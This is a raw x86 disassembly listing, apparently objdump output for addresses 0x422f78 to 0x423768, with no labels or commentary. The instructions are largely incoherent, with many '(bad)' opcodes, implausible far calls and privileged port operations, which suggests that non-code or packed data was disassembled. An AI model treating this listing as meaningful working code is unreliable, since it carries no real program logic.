  422f78:	mov    ebp,0x4478473d
  422f7d:	test   al,0xbb
  422f7f:	inc    edi
  422f80:	sub    BYTE PTR [edx-0x34],dh
  422f83:	hlt    
  422f84:	or     ebp,ecx
  422f86:	(bad)  
  422f87:	mov    cl,0x55
  422f89:	jb     0x422fef
  422f8b:	cmp    BYTE PTR [ecx+0x2bebca01],al
  422f91:	push   0x29d086ad
  422f96:	mov    es,WORD PTR [edx]
  422f98:	cmp    al,0x86
  422f9a:	bound  eax,QWORD PTR [ecx+0x1a]
  422f9d:	pop    esi
  422f9e:	icebp  
  422f9f:	inc    ebp
  422fa0:	cmc    
  422fa1:	or     ecx,eax
  422fa3:	push   edx
  422fa4:	dec    edx
  422fa5:	in     eax,dx
  422fa6:	mov    dl,0xef
  422fa8:	fstp   TBYTE PTR [ebx+0x66]
  422fab:	shl    edi,cl
  422fad:	jmp    0x223841ec
  422fb2:	lds    esp,FWORD PTR [ebx+0x59b75daa]
  422fb8:	mov    eax,ds:0x4106cd2c
  422fbd:	call   0x456c:0x593ee1b6
  422fc4:	mov    dh,0x6c
  422fc6:	cmp    ebx,DWORD PTR [ecx]
  422fc8:	or     DWORD PTR [ebx+0x1a9d4c44],eax
  422fce:	mov    ebp,0xe518de0a
  422fd3:	sbb    ecx,eax
  422fd5:	adc    cl,BYTE PTR [edx-0x7626cb13]
  422fdb:	add    eax,0x9058a38c
  422fe0:	mov    ch,0x43
  422fe2:	test   WORD PTR [esi+eax*8],bp
  422fe6:	aam    0xde
  422fe8:	push   cs
  422fe9:	(bad)  
  422fea:	retf   0x4f57
  422fed:	daa    
  422fee:	pop    ds
  422fef:	clc    
  422ff0:	jno    0x422fd9
  422ff2:	dec    eax
  422ff3:	lods   al,BYTE PTR ds:[esi]
  422ff4:	sub    dh,BYTE PTR [ebp-0x75]
  422ff7:	cwde   
  422ff8:	sub    edx,edx
  422ffa:	mov    edx,0x59a98904
  422fff:	jnp    0x422ffc
  423001:	xor    ebp,DWORD PTR [ebp+0x18b2e98d]
  423007:	not    DWORD PTR [edi-0x25b736ee]
  42300d:	aaa    
  42300e:	jbe    0x42305c
  423010:	std    
  423011:	jnp    0x423066
  423013:	les    edi,FWORD PTR [ebx]
  423015:	push   ecx
  423016:	nop
  423017:	daa    
  423018:	leave  
  423019:	or     DWORD PTR [eax-0x1b],ecx
  42301c:	stos   DWORD PTR es:[edi],eax
  42301d:	mov    al,ah
  42301f:	aam    0x9d
  423021:	fdiv   DWORD PTR [edx+0x6]
  423024:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423025:	int3   
  423026:	mov    ecx,0x1210e0c5
  42302b:	shr    DWORD PTR [esi-0x6a],cl
  42302e:	jg     0x423012
  423030:	jno    0x422fce
  423032:	sub    bh,bh
  423034:	adc    eax,0x7529fc95
  423039:	add    al,0xda
  42303b:	loop   0x422fdf
  42303d:	out    0x23,eax
  42303f:	sbb    dh,BYTE PTR [esi]
  423041:	dec    eax
  423042:	std    
  423043:	mov    esp,0xc4b47895
  423048:	inc    eax
  423049:	rol    DWORD PTR [ecx],cl
  42304b:	sbb    eax,0x16ab5ae7
  423050:	xor    al,0x5c
  423052:	out    dx,al
  423053:	xchg   ecx,eax
  423054:	sahf   
  423055:	pusha  
  423056:	jmp    0x7407cc2b
  42305b:	add    cl,BYTE PTR ds:0x50edf61f
  423061:	dec    edi
  423062:	pusha  
  423063:	xor    esp,DWORD PTR [ecx-0x62eac49b]
  423069:	push   ebx
  42306a:	add    al,0xd9
  42306c:	ins    DWORD PTR es:[edi],dx
  42306d:	mov    al,ds:0x0
	...
  42307a:	repnz rol BYTE PTR ds:0xf6d53751,0xe3
  423082:	test   BYTE PTR [eax],0xec
  423085:	inc    esi
  423086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423087:	inc    ebp
  423088:	add    eax,0x1aab8c6
  42308d:	add    ah,bh
  42308f:	add    DWORD PTR [eax],eax
  423091:	add    BYTE PTR [edi],bl
  423093:	in     al,dx
  423094:	les    ecx,FWORD PTR [ecx+ebx*4]
  423097:	dec    ebp
  423098:	mov    ds:0xc2a3c376,al
  42309d:	ror    BYTE PTR [edi],0x63
  4230a0:	scas   eax,DWORD PTR es:[edi]
  4230a1:	pop    ds
  4230a2:	retf   
  4230a3:	(bad)  
  4230a4:	sti    
  4230a5:	pop    eax
  4230a6:	in     eax,0x59
  4230a8:	lds    eax,FWORD PTR [esi+0x286c9d88]
  4230ae:	pop    ebx
  4230af:	mov    ds:0xf832a614,eax
  4230b4:	jns    0x42307b
  4230b6:	cmp    edx,DWORD PTR [bx+si]
  4230b9:	nop
  4230ba:	xor    ch,BYTE PTR [ecx]
  4230bc:	fstp   DWORD PTR [esi]
  4230be:	int3   
  4230bf:	pop    ds
  4230c0:	push   ss
  4230c1:	jle    0x423052
  4230c3:	cmp    edi,DWORD PTR [esi-0x9291ddc]
  4230c9:	jno    0x4230ce
  4230cb:	mov    DWORD PTR [edi],edx
  4230cd:	js     0x42313d
  4230cf:	arpl   bp,sp
  4230d1:	call   0xc833:0x18df8147
  4230d8:	jno    0x423088
  4230da:	mov    ebp,0x384097ed
  4230df:	hlt    
  4230e0:	mov    dh,0x8b
  4230e2:	dec    eax
  4230e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230e4:	xchg   edi,eax
  4230e5:	and    BYTE PTR [edx],ch
  4230e7:	mov    dl,0x1b
  4230e9:	cli    
  4230ea:	aas    
  4230eb:	adc    ecx,DWORD PTR [ebx]
  4230ed:	push   edx
  4230ee:	fistp  QWORD PTR [esi-0x7520f875]
  4230f4:	(bad)  
  4230f5:	sub    DWORD PTR [ebx],esi
  4230f7:	push   ecx
  4230f8:	test   eax,0x4033ba10
  4230fd:	(bad)  
  4230fe:	addr16 or al,0xa2
  423101:	rol    edi,cl
  423103:	into   
  423104:	dec    edi
  423105:	fwait
  423106:	arpl   ax,di
  423108:	shr    DWORD PTR [ebx+0x32],cl
  42310b:	cmp    ebx,DWORD PTR [eax+0x1ad04b7e]
  423111:	not    DWORD PTR [ebx-0x6f]
  423114:	test   DWORD PTR [eax],ebx
  423116:	scas   eax,DWORD PTR es:[edi]
  423117:	mov    ecx,0x41a92117
  42311c:	in     al,dx
  42311d:	into   
  42311e:	mov    ch,BYTE PTR [esi]
  423120:	pop    eax
  423121:	sbb    al,0x23
  423123:	xchg   esp,eax
  423124:	adc    DWORD PTR [eax],edi
  423126:	ret    0xade2
  423129:	call   0x9ec8488a
  42312e:	stos   BYTE PTR es:[edi],al
  42312f:	test   BYTE PTR [ebp-0x76],0xa5
  423133:	add    DWORD PTR [ebx+0x44af3696],ebp
  423139:	sbb    ecx,DWORD PTR [edi+0x6b08e6f9]
  42313f:	call   0xe905:0x90dc753a
  423146:	rcl    esi,1
  423148:	scas   eax,DWORD PTR es:[edi]
  423149:	xchg   esi,eax
  42314a:	(bad)
  42314e:	cmp    BYTE PTR [edi],cl
  423150:	adc    al,0x6e
  423152:	cwde   
  423153:	aaa    
  423154:	inc    eax
  423155:	xchg   ecx,eax
  423156:	sbb    esi,DWORD PTR [eax+0x24]
  423159:	hlt    
  42315a:	xchg   ebx,eax
  42315b:	mov    al,0x1e
  42315d:	and    bh,BYTE PTR [edx]
  42315f:	cs loope 0x42314e
  423162:	push   edi
  423163:	dec    esi
  423164:	ins    BYTE PTR es:[edi],dx
  423165:	fistp  DWORD PTR [edi-0x5c]
  423168:	std    
  423169:	mov    ebp,DWORD PTR [eax-0x41]
  42316c:	cmp    BYTE PTR [ecx+0x23],0x83
  423170:	cdq    
  423171:	fyl2x  
  423173:	fdivr  st(5),st
  423175:	sbb    al,0x8e
  423177:	inc    ebp
  423178:	test   DWORD PTR [esi+0x61],0x7682a298
  42317f:	enter  0x8e9e,0x4b
  423183:	jmp    0x42313e
  423185:	jmp    0x423166
  423187:	add    eax,DWORD PTR [edi]
  423189:	adc    dh,dl
  42318b:	jno    0x423153
  42318d:	sbb    DWORD PTR [edi-0x104908fb],esi
  423193:	add    al,0x5a
  423195:	lahf   
  423196:	test   ebp,0xdb716b9b
  42319c:	jmp    0xfcfd:0x8b2f8046
  4231a3:	idiv   edi
  4231a5:	and    ah,BYTE PTR [edx]
  4231a7:	xchg   BYTE PTR [eax],ch
  4231a9:	dec    edi
  4231aa:	fidivr DWORD PTR [ebp-0x4d843b69]
  4231b0:	ins    BYTE PTR es:[edi],dx
  4231b1:	xor    al,0xc
  4231b3:	mov    WORD PTR [eax-0x55ad15b7],?
  4231b9:	es pop edi
  4231bb:	xchg   DWORD PTR [esi],eax
  4231bd:	cdq    
  4231be:	icebp  
  4231bf:	fwait
  4231c0:	add    cl,cl
  4231c2:	dec    edx
  4231c3:	mov    edx,0x85465d90
  4231c8:	leave  
  4231c9:	loop   0x42319e
  4231cb:	mov    cl,0xd1
  4231cd:	xchg   ebx,eax
  4231ce:	push   eax
  4231cf:	inc    edi
  4231d0:	and    esi,DWORD PTR [edx-0x1d85559c]
  4231d6:	cmp    BYTE PTR [edx],0x31
  4231d9:	jmp    0xa3e80558
  4231de:	mov    ecx,0x457d006
  4231e3:	pop    ebx
  4231e4:	in     al,dx
  4231e5:	and    al,BYTE PTR [ebx]
  4231e7:	xchg   esp,eax
  4231e8:	jnp    0x423236
  4231ea:	xor    BYTE PTR [edx],0x7
  4231ed:	into   
  4231ee:	jl     0x4231ce
  4231f0:	loop   0x423177
  4231f2:	mov    esp,0xe5cbbf67
  4231f7:	xor    DWORD PTR [ecx+esi*1-0xf],ebp
  4231fb:	inc    esp
  4231fc:	clc    
  4231fd:	data16 and dl,cl
  423200:	add    dl,dh
  423202:	sub    BYTE PTR [edx-0x20],al
  423205:	or     DWORD PTR [ecx+0x78],ebp
  423208:	ficomp WORD PTR [edi+0x60484da4]
  42320e:	add    BYTE PTR [edx+0x32],dh
  423211:	jmp    0x8b35c596
  423216:	in     al,0x2c
  423218:	dec    BYTE PTR [edi+0x4a]
  42321b:	test   eax,0x48e2d359
  423220:	sbb    edi,DWORD PTR [edx+0x7d]
  423223:	dec    edx
  423224:	mov    eax,ds:0xf462df5
  423229:	out    dx,eax
  42322a:	and    eax,0xed41a0c0
  42322f:	mov    al,BYTE PTR [edx-0x34]
  423232:	push   ebp
  423233:	push   ds
  423234:	jmp    0x423270
  423236:	pushf  
  423237:	pop    ss
  423238:	faddp  st(2),st
  42323a:	mov    fs,WORD PTR fs:[ecx-0x3b]
  42323e:	adc    al,0x45
  423240:	xchg   ebx,eax
  423241:	repnz xor BYTE PTR [edx],ch
  423244:	test   al,0x66
  423246:	shr    DWORD PTR [edx+0x3da0fbbd],cl
  42324c:	mov    ecx,DWORD PTR [ecx+ecx*1-0x1c568ef5]
  423253:	cmp    dh,ah
  423255:	ret    
  423256:	shr    DWORD PTR [ecx+0x1e],cl
  423259:	stos   BYTE PTR es:[edi],al
  42325a:	jno    0x42327e
  42325c:	or     ecx,DWORD PTR [ebx]
  42325e:	ja     0x42322e
  423260:	inc    ecx
  423261:	sahf   
  423262:	daa    
  423263:	out    0x5b,al
  423265:	pushf  
  423266:	call   0x2b907f64
  42326b:	jns    0x42323d
  42326d:	jo     0x4231f3
  42326f:	mov    ecx,0x388e0ce6
  423274:	mov    eax,0x4754d9
  423279:	inc    esp
  42327a:	add    eax,0xe892e05f
  42327f:	dec    edx
  423280:	ss or  al,bl
  423283:	inc    ebx
  423284:	(bad)  
  423285:	leave  
  423286:	jo     0x42322d
  423288:	test   al,0x7c
  42328a:	call   0xd17216
	...
  423297:	add    BYTE PTR [eax],al
  423299:	add    BYTE PTR [ebx+0x41],al
  42329c:	popa   
  42329d:	data16 arpl WORD PTR [esi+0x47],sp
  4232a1:	gs push cs
  4232a3:	mov    BYTE PTR [edi-0x37],bh
  4232a6:	lods   eax,DWORD PTR ds:[esi]
  4232a7:	sub    al,0xdd
  4232a9:	mov    edx,0x1acb4
  4232ae:	cld    
  4232af:	add    DWORD PTR [eax],eax
  4232b1:	add    BYTE PTR [edx+0x5d9c33dd],bl
  4232b7:	pop    edi
  4232b8:	jp     0x423254
  4232ba:	push   cs
  4232bb:	adc    eax,0x6437e02e
  4232c0:	mov    ah,0x1b
  4232c2:	mov    WORD PTR [ebx+0xc],cs
  4232c5:	adc    DWORD PTR [eax],eax
  4232c7:	sahf   
  4232c8:	push   0x6
  4232ca:	aas    
  4232cb:	adc    bl,BYTE PTR [edx+0x24c77f59]
  4232d1:	push   0x27e8106b
  4232d6:	mov    al,ds:0x87f2c6aa
  4232db:	jne    0x4232f9
  4232dd:	stos   DWORD PTR es:[edi],eax
  4232de:	and    bl,bl
  4232e0:	cmp    esi,DWORD PTR [edi]
  4232e2:	fidiv  WORD PTR [esi]
  4232e4:	call   0x2c38:0x34dc
  4232ea:	lea    ebp,[esi+edx*2]
  4232ed:	enter  0xcbbc,0xa
  4232f1:	mov    ebp,0xa447e826
  4232f6:	and    ecx,ebp
  4232f8:	xchg   DWORD PTR [ebp+ebp*2-0xa],edi
  4232fc:	gs out 0xbf,eax
  4232ff:	xchg   ebx,eax
  423300:	jle    0x4232e9
  423302:	shl    DWORD PTR [esi],1
  423304:	mov    al,ds:0xd6fd8a57
  423309:	jnp    0x4232f2
  42330b:	outs   dx,BYTE PTR ds:[esi]
  42330c:	outs   dx,BYTE PTR ds:[esi]
  42330d:	outs   dx,BYTE PTR ds:[esi]
  42330e:	repz or ebp,DWORD PTR [ecx]
  423311:	xor    eax,0x9719c42e
  423316:	jmp    0x79a2098d
  42331b:	hlt    
  42331c:	pushf  
  42331d:	lods   al,BYTE PTR ds:[esi]
  42331e:	push   es
  42331f:	cmc    
  423320:	adc    DWORD PTR [ebp+0x2a8d429f],eax
  423326:	cmp    eax,0x530ad9f9
  42332b:	sahf   
  42332c:	pop    ebx
  42332d:	mov    cl,0x76
  42332f:	cmp    eax,0xd1428cb0
  423334:	mov    ebp,0x9ec003bc
  423339:	jae    0x4233b2
  42333b:	ins    BYTE PTR es:[edi],dx
  42333c:	cmp    eax,0x7a34c309
  423341:	fiadd  WORD PTR [eax]
  423343:	cmp    edx,DWORD PTR ds:0x4f736040
  423349:	test   al,0x7c
  42334b:	dec    edx
  42334c:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  42334e:	jp     0x423314
  423350:	cs add al,0x6e
  423353:	or     al,BYTE PTR [esi+edx*2+0x36]
  423357:	fisubr DWORD PTR [edx+0x48399a0]
  42335d:	xchg   ecx,eax
  42335e:	cli    
  42335f:	fisubr DWORD PTR [edx+0x5a]
  423362:	adc    eax,0x4902a25
  423367:	jns    0x4233e2
  423369:	test   ecx,eax
  42336b:	mov    fs,WORD PTR [edx-0x24ca2280]
  423371:	and    bl,BYTE PTR [esi+0x4270a24]
  423377:	pop    ebp
  423378:	retf   
  423379:	xchg   BYTE PTR [edx+ecx*4-0x40],bh
  42337d:	pop    esp
  42337e:	adc    al,0xbd
  423380:	cmp    bl,BYTE PTR [ebx+0x61ac4423]
  423386:	stos   DWORD PTR es:[edi],eax
  423387:	fadd   QWORD PTR [ecx]
  423389:	ja     0x42337d
  42338b:	iret   
  42338c:	jg     0x4233ea
  42338e:	jb     0x4233ae
  423390:	mov    WORD PTR [esi],?
  423392:	cdq    
  423393:	xor    al,BYTE PTR [esi+0x70]
  423396:	sub    bl,dl
  423398:	fidivr WORD PTR [edx]
  42339a:	jp     0x423347
  42339c:	or     al,0xb9
  42339e:	test   eax,0xa7e9a901
  4233a3:	mov    dl,0x49
  4233a5:	es dec edx
  4233a7:	sar    ebx,cl
  4233a9:	sub    al,0xd6
  4233ab:	mov    eax,0x8b540dc2
  4233b0:	dec    ebx
  4233b1:	gs fadd st(5),st
  4233b4:	or     ah,bh
  4233b6:	scas   eax,DWORD PTR es:[edi]
  4233b7:	and    DWORD PTR gs:[ebx],ebp
  4233ba:	std    
  4233bb:	fidivr WORD PTR [ebx+0x54a1960f]
  4233c1:	sub    edx,edx
  4233c3:	push   ss
  4233c4:	arpl   WORD PTR [ebx+0xd],bp
  4233c7:	rcl    DWORD PTR [edi+0x5c],cl
  4233ca:	mov    dh,0x5b
  4233cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233cd:	aaa    
  4233ce:	cmp    eax,0xf33aa077
  4233d3:	fisub  WORD PTR [edx+0x1]
  4233d6:	hlt    
  4233d7:	(bad)  
  4233d9:	pop    es
  4233da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233db:	ret    
  4233dc:	fcomp  QWORD PTR [esp+ecx*8-0x63]
  4233e0:	iret   
  4233e1:	shl    dh,0x63
  4233e4:	int3   
  4233e5:	jb     0x4233ea
  4233e7:	sbb    al,0xe2
  4233e9:	sbb    ecx,DWORD PTR [edx-0x634d3f0a]
  4233ef:	jns    0x4233bc
  4233f1:	mov    edi,DWORD PTR [ebx]
  4233f3:	pop    ss
  4233f4:	retf   0x6af5
  4233f7:	out    0x1,eax
  4233f9:	test   eax,0x6168adb8
  4233fe:	sub    BYTE PTR [ebx+0x63],ah
  423401:	rcr    DWORD PTR [ebp+eiz*8+0x6],cl
  423405:	and    BYTE PTR [edx],dl
  423407:	iret   
  423408:	mov    cl,0xeb
  42340a:	int3   
  42340b:	push   ds
  42340c:	mov    edi,0xa1a4985
  423411:	xchg   BYTE PTR [ebx-0x6a],cl
  423414:	jbe    0x423414
  423416:	in     eax,0x6a
  423418:	jge    0x423485
  42341a:	pop    edi
  42341b:	or     BYTE PTR [edi],al
  42341d:	and    BYTE PTR [edx],dh
  42341f:	aad    0xa8
  423421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423422:	add    DWORD PTR [esi],edx
  423424:	mov    bl,0x71
  423426:	mov    edi,0x9d601d06
  42342b:	js     0x4233ef
  42342d:	es add eax,0xd51ff8a8
  423433:	retf   0xa6b7
  423436:	mov    ch,0xa9
  423438:	ss (bad) 
  42343b:	push   ss
  42343c:	jmp    0x42345f
  42343e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42343f:	lahf   
  423440:	in     al,0xa7
  423442:	fwait
  423443:	imul   ecx,DWORD PTR [eax],0x5
  423446:	(bad)  
  423448:	lods   eax,DWORD PTR ds:[esi]
  423449:	mov    edi,0x3aa6e08b
  42344e:	sar    BYTE PTR [edi+0x1c278027],0xa4
  423455:	in     al,dx
  423456:	les    ebp,FWORD PTR [eax+eax*1-0x22ac893b]
  42345d:	loop   0x4233f7
  42345f:	dec    ebp
  423460:	dec    esp
  423461:	call   0xa35e:0x9a81ae82
  423468:	leave  
  423469:	xor    esi,DWORD PTR [ebx-0x72a43420]
  42346f:	ins    DWORD PTR es:[edi],dx
  423470:	sub    esi,ebp
  423472:	bound  esi,QWORD PTR [edx]
  423474:	inc    esp
  423475:	shr    BYTE PTR [ecx],0x17
  423478:	jmp    0x42349e
  42347a:	scas   al,BYTE PTR es:[edi]
  42347b:	popa   
  42347c:	mov    esp,0xf5d56176
  423481:	fcomp  DWORD PTR [ebp-0x78]
  423484:	ja     0x423415
  423486:	mov    gs,WORD PTR [edi+0x7171ac19]
  42348c:	test   ebx,ebp
  42348e:	add    BYTE PTR [ebx+ebp*4+0x1],0x26
  423493:	sub    al,BYTE PTR [ebx-0x5c]
  423496:	retf   0xd84b
  423499:	jae    0x42341f
  42349b:	fisubr WORD PTR [edi]
  42349d:	xor    dh,BYTE PTR [ebp*2-0x7e0d1ec0]
  4234a4:	pushf  
  4234a5:	test   al,0x77
  4234a7:	adc    BYTE PTR [edx],0x6d
  4234aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234ab:	pop    esp
  4234ac:	lods   al,BYTE PTR ds:[esi]
  4234ad:	rol    DWORD PTR [eax],0x0
	...
  4234b8:	add    BYTE PTR [eax],al
  4234ba:	mov    ebp,edx
  4234bc:	rcr    DWORD PTR [ebx],cl
  4234be:	repz cmp ecx,ebx
  4234c1:	cli    
  4234c2:	cmp    dh,bl
  4234c4:	adc    BYTE PTR [ebx],dl
  4234c6:	into   
  4234c7:	mov    ch,0xf9
  4234c9:	mov    ebp,0x1aeb0
  4234ce:	cld    
  4234cf:	add    DWORD PTR [eax],eax
  4234d1:	add    dh,al
  4234d3:	xchg   edx,eax
  4234d4:	xchg   ebp,eax
  4234d5:	xchg   ecx,eax
  4234d6:	mov    ds:0x87224168,al
  4234db:	cmc    
  4234dc:	mov    dh,0x5
  4234de:	mov    WORD PTR [edi],fs
  4234e0:	in     al,dx
  4234e1:	sbb    bl,cl
  4234e3:	cwde   
  4234e4:	loop   0x423489
  4234e6:	ins    DWORD PTR es:[edi],dx
  4234e7:	push   0xffffffe3
  4234e9:	and    esi,DWORD PTR [ebp-0x4994482b]
  4234ef:	sub    al,0x53
  4234f1:	mov    ds:0x6a6df64,al
  4234f6:	aad    0x3e
  4234f8:	or     dl,BYTE PTR [edi-0x2295a6c9]
  4234fe:	jmp    0x2955:0x50657a87
  423505:	mov    eax,0xca5f646e
  42350a:	(bad)  
  42350b:	mov    eax,ds:0x7371740a
  423510:	add    al,0x24
  423512:	test   al,ah
  423514:	repz (bad) 
  423516:	(bad)  
  423517:	push   ebp
  423518:	int3   
  423519:	jb     0x4234fa
  42351b:	popa   
  42351c:	dec    esp
  42351d:	jmp    0xdd32:0x569309da
  423524:	and    ah,0x66
  423527:	xor    al,0xc
  423529:	loope  0x4234d1
  42352b:	add    esp,ebp
  42352d:	les    ebx,FWORD PTR [eax+0x65]
  423530:	dec    edi
  423531:	or     al,0xdf
  423533:	dec    ebp
  423534:	sbb    DWORD PTR [esi+0x7d],ecx
  423537:	cmp    esp,DWORD PTR [edi-0x2dc111c0]
  42353d:	pop    esi
  42353e:	ror    BYTE PTR ss:[edi],1
  423541:	add    eax,0x21f48dd9
  423546:	repnz scas eax,DWORD PTR es:[edi]
  423548:	push   es
  423549:	jnp    0x42351f
  42354b:	shr    BYTE PTR [ebp+0x2b9f722f],0x9f
  423552:	xor    DWORD PTR [eax+0x78],ecx
  423555:	clc    
  423556:	pop    ecx
  423557:	out    dx,eax
  423558:	xchg   ecx,eax
  423559:	lahf   
  42355a:	ffreep st(3)
  42355c:	pop    ss
  42355d:	mov    esp,0x67278222
  423562:	mov    ebp,0x311dc3bd
  423567:	adc    eax,0xa0495c99
  42356c:	(bad)  
  42356d:	in     eax,0xc8
  42356f:	div    cl
  423571:	iret   
  423572:	mov    ch,0xfd
  423574:	and    al,cl
  423576:	push   ds
  423577:	popf   
  423578:	pop    ecx
  423579:	call   0xed86b580
  42357e:	stos   BYTE PTR es:[edi],al
  42357f:	mov    edx,0xa4f9a430
  423584:	mov    ecx,0xe51c640d
  423589:	mov    cl,bl
  42358b:	aaa    
  42358c:	and    BYTE PTR [edx],dl
  42358e:	mov    bl,0x24
  423590:	lahf   
  423591:	push   esp
  423592:	cld    
  423593:	jno    0x4235b4
  423595:	jne    0x4235ae
  423597:	clc    
  423598:	(bad)  
  423599:	pusha  
  42359a:	or     bl,BYTE PTR [edx+eax*4+0x13fea56e]
  4235a1:	add    eax,0xea44a33f
  4235a6:	xlat   BYTE PTR ds:[ebx]
  4235a7:	test   DWORD PTR es:[eax*4+0x31a5a8c0],ebp
  4235af:	test   al,0xa9
  4235b1:	cmp    al,0x4c
  4235b4:	int    0xf6
  4235b6:	xor    dl,BYTE PTR [eax-0x7878db9f]
  4235bc:	add    eax,0x3b740b13
  4235c1:	push   ebp
  4235c2:	in     eax,dx
  4235c3:	inc    ecx
  4235c4:	popf   
  4235c5:	xchg   edi,ecx
  4235c7:	xor    eax,0x14b269f8
  4235cc:	enter  0x2c61,0x36
  4235d0:	cs stos BYTE PTR es:[edi],al
  4235d2:	ds mov ah,0x79
  4235d5:	out    0x57,eax
  4235d7:	lods   eax,DWORD PTR ds:[esi]
  4235d8:	push   esi
  4235d9:	inc    esi
  4235da:	shr    DWORD PTR [ecx-0x35a77757],1
  4235e0:	ret    
  4235e1:	sub    eax,0x7e9d4a85
  4235e6:	cs mov edx,0x8f6e7c23
  4235ec:	mov    eax,0x8141620
  4235f1:	mov    al,0x1e
  4235f3:	icebp  
  4235f4:	cmp    BYTE PTR [eax],al
  4235f6:	lods   eax,DWORD PTR ds:[esi]
  4235f7:	add    al,0xb8
  4235f9:	mov    edx,0xce990514
  4235fe:	sbb    al,BYTE PTR [esp+edi*4]
  423601:	retf   
  423602:	(bad)  
  423603:	arpl   WORD PTR [eax-0xb],dx
  423606:	adc    ebp,DWORD PTR [ecx]
  423608:	mov    ah,0x27
  42360a:	aaa    
  42360b:	adc    al,0xb3
  42360d:	daa    
  42360e:	jmp    0xaf4fa0ca
  423613:	jecxz  0x423676
  423615:	out    0xaa,al
  423617:	xlat   BYTE PTR ds:[ebx]
  423618:	mov    ebx,0x31e51295
  42361d:	mov    al,ds:0x612f63bb
  423622:	inc    edx
  423623:	jbe    0x42368e
  423625:	sbb    ch,0xea
  423628:	inc    ebp
  423629:	loopne 0x4235bb
  42362b:	xchg   ah,bl
  42362d:	push   ds
  42362e:	jmp    0x4235cc
  423630:	jns    0x4235f4
  423632:	jns    0x423670
  423634:	and    ebp,ebp
  423636:	add    BYTE PTR [edx+0x6b6a15d2],bl
  42363c:	dec    ecx
  42363d:	dec    esi
  42363e:	retf   0xcf71
  423641:	sbb    DWORD PTR [ebx+0x5],eax
  423644:	pop    eax
  423645:	mov    cl,al
  423647:	mov    ?,WORD PTR [esi-0x13ea28b5]
  42364d:	add    cl,BYTE PTR [ecx]
  42364f:	retf   
  423650:	and    al,BYTE PTR [ecx+0x157dc7f3]
  423656:	in     eax,dx
  423657:	lock out 0x7a,eax
  42365a:	or     edi,DWORD PTR [eax-0xa]
  42365d:	leave  
  42365e:	adc    al,BYTE PTR [edi+0x24]
  423661:	shr    DWORD PTR [ebx],cl
  423663:	mov    ?,WORD PTR [edx+0x2a9142ce]
  423669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42366a:	cmp    DWORD PTR ds:0x3b55f8e5,ebp
  423670:	cmp    cl,BYTE PTR [eax]
  423672:	retf   
  423673:	or     eax,ebp
  423675:	nop
  423676:	push   esi
  423677:	adc    BYTE PTR [ebx+esi*8+0x7db37c24],al
  42367e:	dec    ebp
  42367f:	ret    0xaf48
  423682:	xchg   esi,eax
  423683:	push   ss
  423684:	xchg   esp,eax
  423685:	ja     0x42368d
  423687:	fidivr DWORD PTR [eax+ebp*1+0x4acb00b9]
  42368e:	push   esi
  42368f:	sub    al,0x41
  423691:	mov    eax,ds:0x6e998be5
  423696:	lahf   
  423697:	into   
  423698:	idiv   ebx
  42369a:	inc    ecx
  42369b:	int3   
  42369c:	lahf   
  42369d:	call   0x2da99fa3
  4236a2:	ja     0x4236f5
  4236a4:	hlt    
  4236a5:	(bad)  
  4236a6:	ds xor bh,dl
  4236a9:	movups xmm0,XMMWORD PTR [edx-0x23423d19]
  4236b0:	lods   eax,DWORD PTR ds:[esi]
  4236b1:	int3   
  4236b2:	mov    esi,0x4da1da4f
  4236b7:	adc    bh,BYTE PTR [ebx+ebx*1+0x48]
  4236bb:	stos   BYTE PTR es:[edi],al
  4236bc:	out    0xc6,al
  4236be:	fsubr  QWORD PTR [edx]
  4236c0:	outs   dx,BYTE PTR ds:[esi]
  4236c1:	test   DWORD PTR ds:0x366ff7e8,ecx
  4236c7:	(bad)  
  4236c8:	aas    
  4236c9:	fsubr  QWORD PTR [eax]
  4236cb:	fdiv   DWORD PTR [ebx-0x29]
	...
  4236da:	shl    BYTE PTR [edx],cl
  4236dc:	xchg   esi,eax
  4236dd:	call   0xe61:0x6adebef6
  4236e4:	cmp    DWORD PTR [eax],esi
  4236e6:	jb     0x42373d
  4236e8:	add    ah,cl
  4236ea:	lods   al,BYTE PTR ds:[esi]
  4236eb:	mov    al,0x1
  4236ed:	add    ah,bh
  4236ef:	add    DWORD PTR [eax],eax
  4236f1:	add    BYTE PTR [eax],bh
  4236f3:	stos   DWORD PTR es:[edi],eax
  4236f4:	sbb    eax,0xcab29f6f
  4236f9:	add    ecx,esp
  4236fb:	(bad)  
  4236fc:	xchg   DWORD PTR gs:[ebx],esi
  4236ff:	adc    eax,0x659e2552
  423704:	mov    dh,BYTE PTR [edi+0x7]
  423707:	adc    BYTE PTR [ecx],bl
  423709:	mov    al,0xc6
  42370b:	mov    esp,0x4baaba58
  423710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423711:	fld    DWORD PTR [eax]
  423713:	xchg   esp,eax
  423714:	add    dh,bl
  423716:	mov    BYTE PTR [ecx+0x58421663],cl
  42371c:	cmp    al,0xc7
  42371e:	pop    ebp
  42371f:	pop    edx
  423720:	ret    0x2b90
  423723:	jbe    0x42375b
  423725:	mov    cs,WORD PTR [eax-0x7654ee2f]
  42372b:	in     eax,dx
  42372c:	shl    DWORD PTR [eax],0x28
  42372f:	in     eax,0x3d
  423731:	out    dx,al
  423732:	jno    0x4237b3
  423734:	cld    
  423735:	dec    ebx
  423736:	mov    ds,WORD PTR [edi]
  423738:	shr    dl,1
  42373a:	mov    WORD PTR [ebp*1-0x150d9f0c],?
  423741:	mov    esi,0x1b8a831
  423746:	jae    0x423766
  423748:	xchg   ecx,eax
  423749:	and    eax,DWORD PTR [edx+0x13]
  42374c:	or     al,0xa7
  42374e:	fsubr  DWORD PTR [edx+0x5c559dc7]
  423754:	dec    ecx
  423755:	jbe    0x4237be
  423757:	repz push es
  423759:	jle    0x4237d7
  42375b:	dec    eax
  42375c:	sbb    esp,ecx
  42375e:	(bad)  
  42375f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423760:	sub    BYTE PTR [ecx-0x36],bl
  423763:	mov    ah,al
  423765:	(bad)  [edx-0x4a]
  423768:	mov    ebp,0xb8532054
